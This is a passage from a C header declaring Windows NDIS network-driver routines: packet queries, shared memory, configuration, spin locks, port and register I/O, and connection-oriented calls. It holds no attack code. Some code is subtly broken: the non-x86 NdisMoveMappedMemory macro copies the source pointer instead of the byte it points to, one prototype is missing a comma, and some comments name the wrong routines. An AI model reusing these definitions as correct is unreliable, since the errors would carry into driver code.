      PNDIS_BUFFER NdisBuffer;
      UINT PhysicalBufferCount = 0;
      UINT TotalPacketLength = 0;
      UINT Count = 0;

      for (NdisBuffer = Packet->Private.Head;
           NdisBuffer != (PNDIS_BUFFER)NULL;
           NdisBuffer = NdisBuffer->Next) {
        PhysicalBufferCount += NDIS_BUFFER_TO_SPAN_PAGES(NdisBuffer);
        NdisQueryBufferOffset(NdisBuffer, &Offset, &PacketLength);
        TotalPacketLength += PacketLength;
        Count++;
      }
      Packet->Private.PhysicalCount = PhysicalBufferCount;
      Packet->Private.TotalLength = TotalPacketLength;
      Packet->Private.Count = Count;
      Packet->Private.ValidCounts = TRUE;
    }

    if (PhysicalBufferCount)
      *PhysicalBufferCount = Packet->Private.PhysicalCount;

    if (BufferCount)
      *BufferCount = Packet->Private.Count;

    if (TotalPacketLength)
      *TotalPacketLength = Packet->Private.TotalLength;
  }
}

/*
 * VOID
 * NdisQueryPacketLength(
 *   IN PNDIS_PACKET Packet,
 *   OUT PUINT PhysicalBufferCount OPTIONAL,
 *   OUT PUINT BufferCount OPTIONAL,
 *   OUT PNDIS_BUFFER *FirstBuffer OPTIONAL,
 *   OUT PUINT TotalPacketLength OPTIONAL);
 */
#define NdisQueryPacketLength(_Packet,                              \
                              _TotalPacketLength)                   \
{                                                                   \
  if (!(_Packet)->Private.ValidCounts) {                            \
    NdisQueryPacket(_Packet, NULL, NULL, NULL, _TotalPacketLength); \
  }                                                                 \
  else *(_TotalPacketLength) = (_Packet)->Private.TotalLength;      \
}

#endif /* NDIS_LEGACY_DRIVER */

/* Memory management routines */

/*
NDISAPI
VOID
NTAPI
NdisCreateLookaheadBufferFromSharedMemory(
  IN PVOID pSharedMemory,
  IN UINT LookaheadLength,
  OUT PVOID *pLookaheadBuffer);
*/
#define NdisCreateLookaheadBufferFromSharedMemory(_S, _L, _B) ((*(_B)) = (_S))

NDISAPI
VOID
NTAPI
NdisDestroyLookaheadBufferFromSharedMemory(
  IN PVOID pLookaheadBuffer);

#if defined(_M_IX86) || defined(_M_AMD64) || defined(_M_ARM) || defined(_M_PPC)

/*
 * VOID
 * NdisMoveMappedMemory(
 *   OUT PVOID  Destination,
 *   IN PVOID  Source,
 *   IN ULONG  Length);
 */
#define NdisMoveMappedMemory(Destination, Source, Length) \
  RtlCopyMemory(Destination, Source, Length)

/*
 * VOID
 * NdisZeroMappedMemory(
 *   IN PVOID  Destination,
 *   IN ULONG  Length);
 */
#define NdisZeroMappedMemory(Destination, Length) \
  RtlZeroMemory(Destination, Length)

#else

#define NdisMoveMappedMemory(Destination, Source, Length) \
{ \
  PUCHAR _Dest = Destination, _Src = Source, _End = _Dest + Length; \
  while (_Dest < _End) \
    *_Dest++ = _Src++; \
}

#define NdisZeroMappedMemory(Destination, Length) \
{ \
  PUCHAR _Dest = Destination, _End = _Dest + Length; \
  while (_Dest < _End) \
    *_Dest++ = 0; \
}

#endif /* _M_IX86 or _M_AMD64 */

/*
 * VOID
 * NdisMoveFromMappedMemory(
 *   OUT PVOID  Destination,
 *   IN PVOID  Source,
 *   IN ULONG  Length);
 */
#define NdisMoveFromMappedMemory(Destination, Source, Length) \
  NdisMoveMappedMemory(Destination, Source, Length)

/*
 * VOID
 * NdisMoveToMappedMemory(
 *   OUT PVOID  Destination,
 *   IN PVOID  Source,
 *   IN ULONG  Length);
 */
#define NdisMoveToMappedMemory(Destination, Source, Length) \
  NdisMoveMappedMemory(Destination, Source, Length)

/*
 * VOID
 * NdisMUpdateSharedMemory(
 *   IN NDIS_HANDLE  MiniportAdapterHandle,
 *   IN ULONG  Length,
 *   IN PVOID  VirtualAddress,
 *   IN NDIS_PHYSICAL_ADDRESS  PhysicalAddress);
 */
#define NdisMUpdateSharedMemory(_H, _L, _V, _P) \
  NdisUpdateSharedMemory(_H, _L, _V, _P)

NDISAPI
VOID
NTAPI
NdisFreeMemory(
  IN PVOID VirtualAddress,
  IN UINT Length,
  IN UINT MemoryFlags);

NDISAPI
VOID
NTAPI
NdisFreeMemoryWithTag(
  IN PVOID VirtualAddress,
  IN ULONG Tag);

NDISAPI
VOID
NTAPI
NdisImmediateReadSharedMemory(
  IN NDIS_HANDLE WrapperConfigurationContext,
  IN ULONG       SharedMemoryAddress,
  OUT PUCHAR      Buffer,
  IN ULONG       Length);

NDISAPI
VOID
NTAPI
NdisImmediateWriteSharedMemory(
  IN NDIS_HANDLE WrapperConfigurationContext,
  IN ULONG       SharedMemoryAddress,
  IN PUCHAR      Buffer,
  IN ULONG       Length);

NDISAPI
VOID
NTAPI
NdisMAllocateSharedMemory(
  IN	NDIS_HANDLE  MiniportAdapterHandle,
  IN	ULONG  Length,
  IN	BOOLEAN  Cached,
  OUT	 PVOID  *VirtualAddress,
  OUT	 PNDIS_PHYSICAL_ADDRESS  PhysicalAddress);

NDISAPI
NDIS_STATUS
NTAPI
NdisMAllocateSharedMemoryAsync(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN ULONG  Length,
  IN BOOLEAN  Cached,
  IN PVOID  Context);

#if defined(NDIS50)

#define NdisUpdateSharedMemory(NdisAdapterHandle, \
                               Length,            \
                               VirtualAddress,    \
                               PhysicalAddress)

#else

NDISAPI
VOID
NTAPI
NdisUpdateSharedMemory(
  IN NDIS_HANDLE             NdisAdapterHandle,
  IN ULONG                   Length,
  IN PVOID                   VirtualAddress,
  IN NDIS_PHYSICAL_ADDRESS   PhysicalAddress);

#endif /* defined(NDIS50) */

/*
 * ULONG
 * NdisGetPhysicalAddressHigh(
 *   IN NDIS_PHYSICAL_ADDRESS  PhysicalAddress);
 */
#define NdisGetPhysicalAddressHigh(PhysicalAddress) \
  ((PhysicalAddress).HighPart)

/*
 * VOID
 * NdisSetPhysicalAddressHigh(
 *   IN NDIS_PHYSICAL_ADDRESS  PhysicalAddress,
 *   IN ULONG  Value);
 */
#define NdisSetPhysicalAddressHigh(PhysicalAddress, Value) \
  ((PhysicalAddress).HighPart) = (Value)

/*
 * ULONG
 * NdisGetPhysicalAddressLow(
 *   IN NDIS_PHYSICAL_ADDRESS  PhysicalAddress);
 */
#define NdisGetPhysicalAddressLow(PhysicalAddress) \
  ((PhysicalAddress).LowPart)


/*
 * VOID
 * NdisSetPhysicalAddressLow(
 *   IN NDIS_PHYSICAL_ADDRESS  PhysicalAddress,
 *   IN ULONG  Value);
 */
#define NdisSetPhysicalAddressLow(PhysicalAddress, Value) \
  ((PhysicalAddress).LowPart) = (Value)

/*
 * VOID
 * NDIS_PHYSICAL_ADDRESS_CONST(
 *   IN ULONG  Low,
 *   IN LONG  High);
 */
#define NDIS_PHYSICAL_ADDRESS_CONST(Low, High)  \
    { {(ULONG)(Low), (LONG)(High)} }

/*
 * ULONG
 * NdisEqualMemory(
 *  IN CONST VOID  *Source1,
 *  IN CONST VOID  *Source2,
 *  IN ULONG  Length);
 */
#define NdisEqualMemory(Source1, Source2, Length) \
  RtlEqualMemory(Source1, Source2, Length)

/*
 * VOID
 * NdisFillMemory(
 *   IN PVOID  Destination,
 *   IN ULONG  Length,
 *   IN UCHAR  Fill);
 */
#define NdisFillMemory(Destination, Length, Fill) \
  RtlFillMemory(Destination, Length, Fill)

/*
 * VOID
 * NdisMoveMemory(
 *   OUT  PVOID  Destination,
 *   IN PVOID  Source,
 *   IN ULONG  Length);
 */
#define NdisMoveMemory(Destination, Source, Length) \
  RtlCopyMemory(Destination, Source, Length)


/*
 * VOID
 * NdisRetrieveUlong(
 *   IN PULONG  DestinationAddress,
 *   IN PULONG  SourceAddress);
 */
#define NdisRetrieveUlong(DestinationAddress, SourceAddress) \
  RtlRetrieveUlong(DestinationAddress, SourceAddress)


/*
 * VOID
 * NdisStoreUlong(
 *   IN PULONG  DestinationAddress,
 *   IN ULONG  Value);
 */
#define NdisStoreUlong(DestinationAddress, Value) \
  RtlStoreUlong(DestinationAddress, Value)


/*
 * VOID
 * NdisZeroMemory(
 *   IN PVOID  Destination,
 *   IN ULONG  Length)
 */
#define NdisZeroMemory(Destination, Length) \
  RtlZeroMemory(Destination, Length)

typedef VOID
(NTAPI *NDIS_BLOCK_INITIALIZER) (
    IN  PUCHAR  Block,
    IN  SIZE_T  NumberOfBytes
    );

/* Configuration routines */

#if NDIS_LEGACY_DRIVER
NDISAPI
VOID
NTAPI
NdisOpenConfiguration(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_HANDLE ConfigurationHandle,
  IN NDIS_HANDLE WrapperConfigurationContext);
#endif

NDISAPI
VOID
NTAPI
NdisReadNetworkAddress(
  OUT PNDIS_STATUS Status,
  OUT PVOID *NetworkAddress,
  OUT PUINT NetworkAddressLength,
  IN NDIS_HANDLE ConfigurationHandle);

NDISAPI
VOID
NTAPI
NdisReadEisaSlotInformation(
  OUT PNDIS_STATUS  Status,
  IN NDIS_HANDLE  WrapperConfigurationContext,
  OUT PUINT  SlotNumber,
  OUT PNDIS_EISA_FUNCTION_INFORMATION  EisaData);

NDISAPI
VOID
NTAPI
NdisReadEisaSlotInformationEx(
  OUT PNDIS_STATUS  Status,
  IN NDIS_HANDLE  WrapperConfigurationContext,
  OUT PUINT  SlotNumber,
  OUT PNDIS_EISA_FUNCTION_INFORMATION  *EisaData,
  OUT PUINT  NumberOfFunctions);

#if NDIS_LEGACY_MINIPORT

NDISAPI
ULONG
NTAPI
NdisReadPciSlotInformation(
  IN NDIS_HANDLE NdisAdapterHandle,
  IN ULONG SlotNumber,
  IN ULONG Offset,
  OUT PVOID Buffer,
  IN ULONG Length);

NDISAPI
ULONG
NTAPI
NdisWritePciSlotInformation(
  IN NDIS_HANDLE NdisAdapterHandle,
  IN ULONG SlotNumber,
  IN ULONG Offset,
  IN PVOID Buffer,
  IN ULONG Length);

NDISAPI
ULONG
NTAPI
NdisReadPcmciaAttributeMemory(
  IN NDIS_HANDLE NdisAdapterHandle,
  IN ULONG Offset,
  OUT PVOID Buffer,
  IN ULONG Length);

NDISAPI
ULONG
NTAPI
NdisWritePcmciaAttributeMemory(
  IN NDIS_HANDLE NdisAdapterHandle,
  IN ULONG Offset,
  IN PVOID Buffer,
  IN ULONG Length);

#endif /* NDIS_LEGACY_MINIPORT */

/* String management routines */

/*
NDISAPI
NDIS_STATUS
NTAPI
NdisAnsiStringToUnicodeString(
  IN OUT PNDIS_STRING DestinationString,
  IN PNDIS_ANSI_STRING SourceString);
*/
#define NdisAnsiStringToUnicodeString(_us, _as) RtlAnsiStringToUnicodeString(_us, _as, FALSE)

/*
 * BOOLEAN
 * NdisEqualString(
 *   IN PNDIS_STRING String1,
 *   IN PNDIS_STRING String2,
 *   IN BOOLEAN CaseInsensitive);
 */
#define NdisEqualString RtlEqualString

#define NdisEqualUnicodeString RtlEqualUnicodeString

/*
NDISAPI
VOID
NTAPI
NdisInitAnsiString(
  IN OUT PNDIS_ANSI_STRING DestinationString,
  IN PCSTR SourceString);
*/
#define NdisInitAnsiString RtlInitString

NDISAPI
VOID
NTAPI
NdisInitUnicodeString(
  IN OUT PNDIS_STRING  DestinationString,
  IN PCWSTR  SourceString);

/*
NDISAPI
NDIS_STATUS
NTAPI
NdisUnicodeStringToAnsiString(
  IN OUT PNDIS_ANSI_STRING DestinationString,
  IN PNDIS_STRING SourceString);
*/
#define NdisUnicodeStringToAnsiString(_as, _us) RtlUnicodeStringToAnsiString(_as, _us, FALSE)

#define NdisFreeString(_s) NdisFreeMemory((_s).Buffer, (_s).MaximumLength, 0)
#define NdisPrintString(_s) DbgPrint("%ls", (_s).Buffer)

/* Spin lock reoutines */

/*
NDISAPI
VOID
NTAPI
NdisAllocateSpinLock(
  IN PNDIS_SPIN_LOCK SpinLock);
*/
#define NdisAllocateSpinLock(_SpinLock) KeInitializeSpinLock(&(_SpinLock)->SpinLock)

/*
NDISAPI
VOID
NTAPI
NdisFreeSpinLock(
  IN PNDIS_SPIN_LOCK  SpinLock);
*/
#define NdisFreeSpinLock(_SpinLock)

/*
NDISAPI
VOID
NTAPI
NdisAcquireSpinLock(
  IN PNDIS_SPIN_LOCK  SpinLock);
*/
#define NdisAcquireSpinLock(_SpinLock) KeAcquireSpinLock(&(_SpinLock)->SpinLock, &(_SpinLock)->OldIrql)

/*
NDISAPI
VOID
NTAPI
NdisReleaseSpinLock(
  IN PNDIS_SPIN_LOCK  SpinLock);
*/
#define NdisReleaseSpinLock(_SpinLock) KeReleaseSpinLock(&(_SpinLock)->SpinLock,(_SpinLock)->OldIrql)

/*
NDISAPI
VOID
NTAPI
NdisDprAcquireSpinLock(
  IN PNDIS_SPIN_LOCK  SpinLock);
*/
#define NdisDprAcquireSpinLock(_SpinLock) KeAcquireSpinLockAtDpcLevel(&(_SpinLock)->SpinLock)

/*
NDISAPI
VOID
NTAPI
NdisDprReleaseSpinLock(
  IN PNDIS_SPIN_LOCK  SpinLock);
*/
#define NdisDprReleaseSpinLock(_SpinLock) KeReleaseSpinLockFromDpcLevel(&(_SpinLock)->SpinLock)

/* I/O routines */

/*
 * VOID
 * NdisRawReadPortBufferUchar(
 *   IN ULONG Port,
 *   OUT PUCHAR Buffer,
 *   IN ULONG Length);
 */
#define NdisRawReadPortBufferUchar(Port, Buffer, Length) \
  READ_PORT_BUFFER_UCHAR((PUCHAR)(Port), (PUCHAR)(Buffer), (Length))

/*
 * VOID
 * NdisRawReadPortBufferUlong(
 *   IN ULONG Port,
 *   OUT PULONG Buffer,
 *   IN ULONG Length);
 */
#define NdisRawReadPortBufferUlong(Port, Buffer, Length) \
  READ_PORT_BUFFER_ULONG((PULONG)(Port), (PULONG)(Buffer), (Length))

/*
 * VOID
 * NdisRawReadPortBufferUshort(
 *   IN ULONG Port,
 *   OUT PUSHORT Buffer,
 *   IN ULONG Length);
 */
#define NdisRawReadPortBufferUshort(Port, Buffer, Length) \
  READ_PORT_BUFFER_USHORT((PUSHORT)(Port), (PUSHORT)(Buffer), (Length))

/*
 * VOID
 * NdisRawReadPortUchar(
 *   IN ULONG Port,
 *   OUT PUCHAR Data);
 */
#define NdisRawReadPortUchar(Port, Data) \
  *(Data) = READ_PORT_UCHAR((PUCHAR)(Port))

/*
 * VOID
 * NdisRawReadPortUlong(
 *   IN ULONG Port,
 *   OUT PULONG Data);
 */
#define NdisRawReadPortUlong(Port, Data) \
  *(Data) = READ_PORT_ULONG((PULONG)(Port))

/*
 * VOID
 * NdisRawReadPortUshort(
 *   IN ULONG Port,
 *   OUT PUSHORT Data);
 */
#define NdisRawReadPortUshort(Port, Data) \
  *(Data) = READ_PORT_USHORT((PUSHORT)(Port))

/*
 * VOID
 * NdisRawWritePortBufferUchar(
 *   IN ULONG Port,
 *   IN PUCHAR Buffer,
 *   IN ULONG Length);
 */
#define NdisRawWritePortBufferUchar(Port, Buffer, Length) \
  WRITE_PORT_BUFFER_UCHAR((PUCHAR)(Port), (PUCHAR)(Buffer), (Length))

/*
 * VOID
 * NdisRawWritePortBufferUlong(
 *   IN ULONG Port,
 *   IN PULONG Buffer,
 *   IN ULONG Length);
 */
#define NdisRawWritePortBufferUlong(Port, Buffer, Length) \
  WRITE_PORT_BUFFER_ULONG((PULONG)(Port), (PULONG)(Buffer), (Length))

/*
 * VOID
 * NdisRawWritePortBufferUshort(
 *   IN ULONG Port,
 *   IN PUSHORT Buffer,
 *   IN ULONG Length);
 */
#define NdisRawWritePortBufferUshort(Port, Buffer, Length) \
  WRITE_PORT_BUFFER_USHORT((PUSHORT)(Port), (PUSHORT)(Buffer), (Length))

/*
 * VOID
 * NdisRawWritePortUchar(
 *   IN ULONG Port,
 *   IN UCHAR Data);
 */
#define NdisRawWritePortUchar(Port, Data) \
  WRITE_PORT_UCHAR((PUCHAR)(Port), (UCHAR)(Data))

/*
 * VOID
 * NdisRawWritePortUlong(
 *   IN ULONG Port,
 *   IN ULONG Data);
 */
#define NdisRawWritePortUlong(Port, Data) \
  WRITE_PORT_ULONG((PULONG)(Port), (ULONG)(Data))

/*
 * VOID
 * NdisRawWritePortUshort(
 *   IN ULONG Port,
 *   IN USHORT Data);
 */
#define NdisRawWritePortUshort(Port, Data) \
  WRITE_PORT_USHORT((PUSHORT)(Port), (USHORT)(Data))


/*
 * VOID
 * NdisReadRegisterUchar(
 *   IN PUCHAR Register,
 *   OUT PUCHAR Data);
 */
#define NdisReadRegisterUchar(Register, Data) \
  *(Data) = *(Register)

/*
 * VOID
 * NdisReadRegisterUlong(
 *   IN PULONG  Register,
 *   OUT PULONG  Data);
 */
#define NdisReadRegisterUlong(Register, Data)   \
  *(Data) = *(Register)

/*
 * VOID
 * NdisReadRegisterUshort(
 *   IN PUSHORT Register,
 *   OUT PUSHORT Data);
 */
#define NdisReadRegisterUshort(Register, Data) \
    *(Data) = *(Register)

/*
 * VOID
 * NdisReadRegisterUchar(
 *   IN PUCHAR Register,
 *   IN UCHAR Data);
 */
#define NdisWriteRegisterUchar(Register, Data) \
  WRITE_REGISTER_UCHAR((Register), (Data))

/*
 * VOID
 * NdisReadRegisterUlong(
 *   IN PULONG Register,
 *   IN ULONG Data);
 */
#define NdisWriteRegisterUlong(Register, Data) \
  WRITE_REGISTER_ULONG((Register), (Data))

/*
 * VOID
 * NdisReadRegisterUshort(
 *   IN PUSHORT Register,
 *   IN USHORT Data);
 */
#define NdisWriteRegisterUshort(Register, Data) \
  WRITE_REGISTER_USHORT((Register), (Data))


/* Linked lists */

/*
 * VOID
 * NdisInitializeListHead(
 *   IN PLIST_ENTRY ListHead);
 */
#define NdisInitializeListHead InitializeListHead

/*
 * PLIST_ENTRY
 * NdisInterlockedInsertHeadList(
 *   IN PLIST_ENTRY  ListHead,
 *   IN PLIST_ENTRY  ListEntry,
 *   IN PNDIS_SPIN_LOCK  SpinLock);
 */
#define NdisInterlockedInsertHeadList(_ListHead, _ListEntry, _SpinLock) \
  ExInterlockedInsertHeadList(_ListHead, _ListEntry, &(_SpinLock)->SpinLock)

/*
 * PLIST_ENTRY
 * NdisInterlockedInsertTailList(
 *   IN PLIST_ENTRY  ListHead,
 *   IN PLIST_ENTRY  ListEntry,
 *   IN PNDIS_SPIN_LOCK  SpinLock);
 */
#define NdisInterlockedInsertTailList(_ListHead, _ListEntry, _SpinLock) \
  ExInterlockedInsertTailList(_ListHead, _ListEntry, &(_SpinLock)->SpinLock)

/*
 * PLIST_ENTRY
 * NdisInterlockedRemoveHeadList(
 *   IN PLIST_ENTRY  ListHead,
 *   IN PNDIS_SPIN_LOCK  SpinLock);
*/
#define NdisInterlockedRemoveHeadList(_ListHead, _SpinLock) \
  ExInterlockedRemoveHeadList(_ListHead, &(_SpinLock)->SpinLock)

/*
 * VOID
 * NdisInitializeSListHead(
 *   IN PSLIST_HEADER SListHead);
 */
#define NdisInitializeSListHead(SListHead) ExInitializeSListHead(SListHead)

/*
 * USHORT NdisQueryDepthSList(
 *   IN PSLIST_HEADER SListHead);
 */
#define NdisQueryDepthSList(SListHead) ExQueryDepthSList(SListHead)

#define NdisInterlockedPushEntryList(ListHead, ListEntry, Lock) \
  ExInterlockedPushEntryList(ListHead, ListEntry, &(Lock)->SpinLock)

#define NdisInterlockedPopEntryList(ListHead, Lock) \
  ExInterlockedPopEntryList(ListHead, &(Lock)->SpinLock)

/* Non-paged lookaside lists */

#define NdisInitializeNPagedLookasideList(_L, _AR, _FR, _Fl, _S, _T, _D) \
  ExInitializeNPagedLookasideList(_L, _AR, _FR, _Fl, _S, _T, _D)
#define NdisDeleteNPagedLookasideList(_L) ExDeleteNPagedLookasideList(_L)
#define NdisAllocateFromNPagedLookasideList(_L) ExAllocateFromNPagedLookasideList(_L)
#define NdisFreeToNPagedLookasideList(_L, _E) ExFreeToNPagedLookasideList(_L, _E)

/* Interlocked routines */

/*
 * LONG
 * NdisInterlockedDecrement(
 *   IN PLONG  Addend);
 */
#define NdisInterlockedDecrement(Addend) InterlockedDecrement(Addend)

/*
 * LONG
 * NdisInterlockedIncrement(
 *   IN PLONG  Addend);
 */
#define NdisInterlockedIncrement(Addend) InterlockedIncrement(Addend)

/*
 * VOID
 * NdisInterlockedAddUlong(
 *   IN PULONG  Addend,
 *   IN ULONG  Increment,
 *   IN PNDIS_SPIN_LOCK  SpinLock);
 */
#define NdisInterlockedAddUlong(_Addend, _Increment, _SpinLock) \
  ExInterlockedAddUlong(_Addend, _Increment, &(_SpinLock)->SpinLock)

/* Miscellaneous routines */

NDISAPI
VOID
NTAPI
NdisCloseConfiguration(
  IN NDIS_HANDLE ConfigurationHandle);

NDISAPI
VOID
NTAPI
NdisReadConfiguration(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_CONFIGURATION_PARAMETER *ParameterValue,
  IN NDIS_HANDLE ConfigurationHandle,
  IN PNDIS_STRING Keyword,
  IN NDIS_PARAMETER_TYPE ParameterType);

NDISAPI
VOID
NTAPI
NdisWriteConfiguration(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE WrapperConfigurationContext,
  IN PNDIS_STRING Keyword,
  IN PNDIS_CONFIGURATION_PARAMETER ParameterValue);

NDISAPI
VOID
__cdecl
NdisWriteErrorLogEntry(
  IN NDIS_HANDLE NdisAdapterHandle,
  IN NDIS_ERROR_CODE ErrorCode,
  IN ULONG NumberOfErrorValues,
  IN ...);

NDISAPI
VOID
NTAPI
NdisInitializeString(
  OUT PNDIS_STRING Destination,
  IN PUCHAR Source);

/*
 * VOID
 * NdisStallExecution(
 *   IN UINT MicrosecondsToStall)
 */
#define NdisStallExecution KeStallExecutionProcessor

/*
NDISAPI
VOID
NTAPI
NdisGetCurrentSystemTime(
  IN PLARGE_INTEGER  pSystemTime);
*/
#define NdisGetCurrentSystemTime KeQuerySystemTime

#if NDIS_SUPPORT_60_COMPATIBLE_API
NDISAPI
CCHAR
NTAPI
NdisSystemProcessorCount(VOID);
#endif

NDISAPI
VOID
NTAPI
NdisGetCurrentProcessorCpuUsage(
  OUT PULONG pCpuUsage);

/* NDIS helper macros */

/*
 * VOID
 * NDIS_INIT_FUNCTION(FunctionName)
 */
#define NDIS_INIT_FUNCTION(FunctionName)    \
  alloc_text(init, FunctionName)

/*
 * VOID
 * NDIS_PAGABLE_FUNCTION(FunctionName)
 */
#define NDIS_PAGEABLE_FUNCTION(FunctionName) \
  alloc_text(page, FunctionName)

#define NDIS_PAGABLE_FUNCTION NDIS_PAGEABLE_FUNCTION


/* NDIS 4.0 extensions */

NDISAPI
VOID
NTAPI
NdisMFreeSharedMemory(
	IN NDIS_HANDLE  MiniportAdapterHandle,
	IN ULONG  Length,
	IN BOOLEAN  Cached,
	IN PVOID  VirtualAddress,
	IN NDIS_PHYSICAL_ADDRESS  PhysicalAddress);

NDISAPI
VOID
NTAPI
NdisMWanIndicateReceive(
	OUT PNDIS_STATUS  Status,
	IN NDIS_HANDLE  MiniportAdapterHandle,
	IN NDIS_HANDLE  NdisLinkContext,
	IN PUCHAR  PacketBuffer,
	IN UINT  PacketSize);

NDISAPI
VOID
NTAPI
NdisMWanIndicateReceiveComplete(
	IN NDIS_HANDLE  MiniportAdapterHandle
	IN NDIS_HANDLE  NdisLinkContext);

NDISAPI
VOID
NTAPI
NdisMWanSendComplete(
	IN NDIS_HANDLE  MiniportAdapterHandle,
	IN PNDIS_WAN_PACKET  Packet,
	IN NDIS_STATUS  Status);

NDISAPI
NDIS_STATUS
NTAPI
NdisPciAssignResources(
	IN NDIS_HANDLE  NdisMacHandle,
	IN NDIS_HANDLE  NdisWrapperHandle,
	IN NDIS_HANDLE  WrapperConfigurationContext,
	IN ULONG  SlotNumber,
	OUT PNDIS_RESOURCE_LIST  *AssignedResources);


/* NDIS 5.0 extensions */

NDISAPI
NDIS_STATUS
NTAPI
NdisAllocateMemoryWithTag(
  OUT PVOID *VirtualAddress,
  IN UINT Length,
  IN ULONG Tag);

NDISAPI
VOID
NTAPI
NdisGetCurrentProcessorCounts(
  OUT PULONG pIdleCount,
  OUT PULONG pKernelAndUser,
  OUT PULONG pIndex);

#if NDIS_LEGACY_DRIVER
NDISAPI
VOID
NTAPI
NdisGetSystemUpTime(
  OUT PULONG pSystemUpTime);
#endif

#if NDIS_SUPPORT_60_COMPATIBLE_API

NDISAPI
VOID
NTAPI
NdisAcquireReadWriteLock(
  IN OUT PNDIS_RW_LOCK Lock,
  IN BOOLEAN fWrite,
  OUT PLOCK_STATE LockState);

NDISAPI
VOID
NTAPI
NdisInitializeReadWriteLock(
  OUT PNDIS_RW_LOCK Lock);

NDISAPI
VOID
NTAPI
NdisReleaseReadWriteLock(
  IN OUT PNDIS_RW_LOCK Lock,
  IN PLOCK_STATE LockState);

#if NDIS_SUPPORT_NDIS6

NDISAPI
VOID
NTAPI
NdisDprAcquireReadWriteLock(
  IN PNDIS_RW_LOCK Lock,
  IN BOOLEAN fWrite,
  IN PLOCK_STATE LockState);

NDISAPI
VOID
NTAPI
NdisDprReleaseReadWriteLock(
  IN PNDIS_RW_LOCK Lock,
  IN PLOCK_STATE LockState);

#endif /* NDIS_SUPPORT_NDIS6 */

#endif /* NDIS_SUPPORT_60_COMPATIBLE_API */

NDISAPI
NDIS_STATUS
NTAPI
NdisMDeregisterDevice(
  IN NDIS_HANDLE  NdisDeviceHandle);

NDISAPI
VOID
NTAPI
NdisMGetDeviceProperty(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN OUT PDEVICE_OBJECT  *PhysicalDeviceObject  OPTIONAL,
  IN OUT PDEVICE_OBJECT  *FunctionalDeviceObject  OPTIONAL,
  IN OUT PDEVICE_OBJECT  *NextDeviceObject  OPTIONAL,
  IN OUT PCM_RESOURCE_LIST  *AllocatedResources  OPTIONAL,
  IN OUT PCM_RESOURCE_LIST  *AllocatedResourcesTranslated  OPTIONAL);

NDISAPI
NDIS_STATUS
NTAPI
NdisMInitializeScatterGatherDma(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN BOOLEAN  Dma64BitAddresses,
  IN ULONG  MaximumPhysicalMapping);

NDISAPI
NDIS_STATUS
NTAPI
NdisMPromoteMiniport(
  IN NDIS_HANDLE  MiniportAdapterHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisMQueryAdapterInstanceName(
  OUT PNDIS_STRING  AdapterInstanceName,
  IN NDIS_HANDLE  MiniportAdapterHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisMRegisterDevice(
  IN NDIS_HANDLE  NdisWrapperHandle,
  IN PNDIS_STRING  DeviceName,
  IN PNDIS_STRING  SymbolicName,
  IN PDRIVER_DISPATCH  MajorFunctions[],
  OUT PDEVICE_OBJECT  *pDeviceObject,
  OUT NDIS_HANDLE  *NdisDeviceHandle);

NDISAPI
VOID
NTAPI
NdisMRegisterUnloadHandler(
  IN NDIS_HANDLE  NdisWrapperHandle,
  IN PDRIVER_UNLOAD  UnloadHandler);

NDISAPI
NDIS_STATUS
NTAPI
NdisMRemoveMiniport(
  IN NDIS_HANDLE  MiniportAdapterHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisMSetMiniportSecondary(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_HANDLE  PrimaryMiniportAdapterHandle);

NDISAPI
VOID
NTAPI
NdisOpenConfigurationKeyByIndex(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE ConfigurationHandle,
  IN ULONG Index,
  OUT PNDIS_STRING KeyName,
  OUT PNDIS_HANDLE KeyHandle);

NDISAPI
VOID
NTAPI
NdisOpenConfigurationKeyByName(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE ConfigurationHandle,
  IN PNDIS_STRING SubKeyName,
  OUT PNDIS_HANDLE SubKeyHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisQueryAdapterInstanceName(
  OUT PNDIS_STRING AdapterInstanceName,
  IN NDIS_HANDLE NdisBindingHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisQueryBindInstanceName(
  OUT PNDIS_STRING pAdapterInstanceName,
  IN NDIS_HANDLE BindingContext);

NDISAPI
NDIS_STATUS
NTAPI
NdisWriteEventLogEntry(
  IN PVOID LogHandle,
  IN NDIS_STATUS EventCode,
  IN ULONG UniqueEventValue,
  IN USHORT NumStrings,
  IN PVOID StringsList OPTIONAL,
  IN ULONG DataSize,
  IN PVOID Data OPTIONAL);

/* Connectionless services */

NDISAPI
NDIS_STATUS
NTAPI
NdisClAddParty(
  IN NDIS_HANDLE  NdisVcHandle,
  IN NDIS_HANDLE  ProtocolPartyContext,
  IN OUT PCO_CALL_PARAMETERS  CallParameters,
  OUT PNDIS_HANDLE  NdisPartyHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisClCloseAddressFamily(
  IN NDIS_HANDLE  NdisAfHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisClCloseCall(
  IN NDIS_HANDLE NdisVcHandle,
  IN NDIS_HANDLE NdisPartyHandle  OPTIONAL,
  IN PVOID  Buffer  OPTIONAL,
  IN UINT  Size);

NDISAPI
NDIS_STATUS
NTAPI
NdisClDeregisterSap(
  IN NDIS_HANDLE  NdisSapHandle);

NDISAPI
NDIS_STATUS
NTAPI
NdisClDropParty(
  IN NDIS_HANDLE  NdisPartyHandle,
  IN PVOID  Buffer  OPTIONAL,
  IN UINT  Size);

NDISAPI
VOID
NTAPI
NdisClIncomingCallComplete(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  NdisVcHandle,
  IN PCO_CALL_PARAMETERS  CallParameters);

NDISAPI
NDIS_STATUS
NTAPI
NdisClMakeCall(
  IN NDIS_HANDLE  NdisVcHandle,
  IN OUT PCO_CALL_PARAMETERS  CallParameters,
  IN NDIS_HANDLE  ProtocolPartyContext  OPTIONAL,
  OUT PNDIS_HANDLE  NdisPartyHandle  OPTIONAL);

NDISAPI
NDIS_STATUS
NTAPI
NdisClModifyCallQoS(
  IN NDIS_HANDLE  NdisVcHandle,
